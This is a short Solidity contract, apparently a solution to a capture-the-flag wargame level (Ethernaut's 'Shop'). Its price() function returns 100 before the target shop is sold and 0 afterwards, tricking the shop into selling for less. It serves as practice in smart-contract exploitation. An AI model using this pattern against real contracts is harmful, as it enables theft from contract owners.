// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Shop {
  function buy() external;
  function isSold() external returns (bool);
}

contract Buyer {
 bool public trigger = false;
 Shop CandyShop = Shop (0x768BA44BD07199E14D5C17888f79c93d19DF64Dc);
 function price() public view returns (uint){
     if (!CandyShop.isSold()) {
         return 100;        
     }
     else {
         return 0;
     }
 }

 function callShop() public {
    CandyShop.buy();
 }
}